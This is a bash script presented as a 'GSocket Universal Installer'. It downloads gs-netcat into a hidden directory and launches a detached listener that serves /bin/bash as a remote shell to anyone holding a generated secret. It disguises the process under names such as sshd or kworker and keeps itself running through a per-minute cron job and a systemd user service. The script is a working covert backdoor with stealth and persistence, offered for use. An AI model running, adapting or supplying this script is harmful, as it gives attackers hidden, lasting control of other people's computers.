#!/bin/bash
# GSocket Universal Installer (Linux + FreeBSD + macOS)

set -e

# Detect OS
OS=$(uname -s | tr '[:upper:]' '[:lower:]')
ARCH=$(uname -m)

# Set binary URL based on OS
case "$OS" in
    linux)
        case "$ARCH" in
            x86_64)  BIN_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-x86_64" ;;
            aarch64) BIN_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-arm64" ;;
            armv7l)  BIN_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-armv7" ;;
            *)       BIN_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-x86_64" ;;
        esac
        ;;
    freebsd)
        BIN_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_freebsd-x86_64"
        ;;
    darwin)
        BIN_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_macos-x86_64"
        ;;
    *)
        echo "Unsupported OS: $OS"
        exit 1
        ;;
esac

# Home detection
if [ -z "$HOME" ]; then
    HOME=$(getent passwd "$(whoami)" | cut -d: -f6)
fi

# Generate secret
GS_SECRET=$(openssl rand -hex 20 2>/dev/null || date +%s | sha256sum | head -c 40)

# Install dir
INSTALL_DIR="$HOME/.config/.cache/.systemd"
BIN_PATH="$INSTALL_DIR/gs-netcat"
SECRET_FILE="$INSTALL_DIR/.secret"
HIDE_NAME=$(shuf -e "systemd" "sshd" "kworker" "rsyslogd" "dbus-daemon" "NetworkManager" -n1 2>/dev/null || echo "systemd")

mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# Download binary
echo "[+] Downloading GSocket for $OS..."
curl -fsSL "$BIN_URL" -o "$BIN_PATH" || {
    echo "Download failed, trying alternative..."
    # Fallback to static Alpine for Linux, or try other mirrors
    if [ "$OS" = "linux" ]; then
        curl -fsSL "https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-x86_64-alpine" -o "$BIN_PATH"
    else
        exit 1
    fi
}
chmod +x "$BIN_PATH"

# Save secret
echo "$GS_SECRET" > "$SECRET_FILE"
chmod 600 "$SECRET_FILE"

# Start daemon with a watchdog loop (to keep it alive)
echo "[+] Starting daemon..."
cd "$HOME"

# Use a while loop to restart if it dies
nohup bash -c "
    while true; do
        GSOCKET_ARGS=\"-k $SECRET_FILE -liqD -e /bin/bash --noprofile --norc\"
        exec -a \"$HIDE_NAME\" \"$BIN_PATH\"
        sleep 5
    done
" >/dev/null 2>&1 &

# Persistence: cron (every minute)
(crontab -l 2>/dev/null | grep -v "gs-netcat" || true; echo "* * * * * cd $HOME && GSOCKET_ARGS=\"-k $SECRET_FILE -liqD -e /bin/bash --noprofile --norc\" exec -a $HIDE_NAME $BIN_PATH >/dev/null 2>&1") | crontab - 2>/dev/null

# Systemd user (if available)
if systemctl --user --no-pager status 2>/dev/null | grep -q "State:"; then
    SERVICE_DIR="$HOME/.config/systemd/user"
    mkdir -p "$SERVICE_DIR"
    cat > "$SERVICE_DIR/gsocket.service" << EOF
[Unit]
Description=GSocket Tunnel
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=30
Environment="GSOCKET_ARGS=-k $SECRET_FILE -liqD -e /bin/bash --noprofile --norc"
ExecStart=/bin/bash -c "exec -a $HIDE_NAME $BIN_PATH"
WorkingDirectory=$HOME

[Install]
WantedBy=default.target
EOF
    systemctl --user daemon-reload 2>/dev/null
    systemctl --user enable gsocket.service 2>/dev/null
    systemctl --user restart gsocket.service 2>/dev/null
fi

# Output token
echo "$GS_SECRET"
